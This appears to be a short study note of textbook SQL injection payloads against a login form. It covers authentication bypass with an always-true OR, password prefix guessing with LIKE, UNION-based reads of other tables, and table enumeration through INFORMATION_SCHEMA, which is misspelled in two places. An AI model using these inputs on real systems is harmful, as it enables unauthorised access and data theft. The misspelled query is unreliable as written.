SQL Injections

Examples

  • General SQL injection.

    SELECT * FROM table-name WHERE username = ' ' AND passwd = '' OR 'a'='a'

    username = (Empty)

    passwd   = ' OR 'a'='a

  • Finding the password for a specific user

    SELECT * FROM table-name WHERE username = 'admin' AND passwd = '' OR passwd LIKE '1qaz%'

    username = admin

    passwd   = ' OR passwd LIKE '1qaz%

  • UNION

    SELECT * FROM table-name1 WHERE username = ' ' AND passwd = '' UNION SELECT * FROM table-name2 #'

    username = (Empty)

    passwd   = ' UNION SELECT * FROM table-name2 #

    Warning
    The numbers of columns obtained by SELECT * FROM table-name1 and SELECT * FROM table-name2 must be same.

  • INFORMATION_SCHEMA

    SELECT * FROM table-name WHERE username = ' ' AND passwd = ''
    UNION SELECT TABLE_NAME, ..., FROM INFROMATION_SCHEMA.TABLES #    '

    username = (Empty)

    passwd   = ' UNION SELECT TABLE_NAME, ..., FROM INFROMATION_SCHEMA.TABLES #
